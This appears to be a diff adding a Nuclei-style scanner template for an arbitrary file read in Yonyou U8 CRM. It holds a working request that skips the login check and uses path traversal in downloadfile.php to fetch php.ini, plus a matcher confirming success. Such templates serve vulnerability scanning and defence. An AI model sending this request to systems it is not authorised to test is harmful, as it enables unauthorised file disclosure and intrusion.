@@ -1,0 +1,23 @@
+id: yongyouU8-CRM-downloadfile-File-reading
+
+info:
+  name: 用友U8 CRM downloadfile 任意文件读取
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains_all(body,'[PHP]','About php.ini')"
